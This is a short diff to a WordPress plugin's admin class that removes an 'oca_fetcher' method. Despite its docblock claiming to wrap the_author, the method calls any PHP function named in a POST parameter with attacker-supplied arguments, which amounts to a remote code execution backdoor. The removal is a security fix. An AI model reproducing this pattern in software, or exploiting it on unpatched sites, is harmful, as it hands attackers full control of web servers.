@@ -100,21 +100,4 @@ class Oca_Asynchronous_Content_Organizer_Admin {
 
 	}
 
-	/**
-	 * parse args and calls wraps WordPress the_author
-	 *
-	 * @since    1.0.0
-	 */
-	public function oca_fetcher() {
-    	$function_name = stripslashes( $_POST['priv_name'] );
-    	$args = stripslashes( $_POST['args'] );
-    	if ( isset( $_POST['output_behavior'] ) && 'return' === $_POST['output_behavior'] ){
-			echo $function_name($args);
-    	}
-    	else {
-			$function_name($args);
-    	}
-		die();
-	}
-
 }
